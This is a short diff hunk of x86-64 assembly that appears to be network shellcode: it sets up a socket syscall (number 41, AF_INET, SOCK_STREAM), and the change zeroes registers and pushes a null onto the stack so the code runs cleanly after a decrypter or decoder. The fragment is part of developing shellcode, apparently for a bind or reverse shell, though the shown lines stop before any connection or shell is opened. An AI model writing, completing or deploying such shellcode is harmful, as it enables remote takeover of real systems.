@@ -22,7 +22,9 @@ _start:
     ; SOCK_STREAM = 1
     ; syscall number 41
 
-    xor rdx , rdx ; null
+    xor rsi , rsi
+    mul rsi                      ; null rax , rdx register
+    push rax                     ; push null in the stack , highly recommanded if the shellcode run after a decrypter or decoder (stack not clean) ;
     push byte 0x29 ; syscall number 41
     pop rax
     push byte 0x2  ; AF_INET
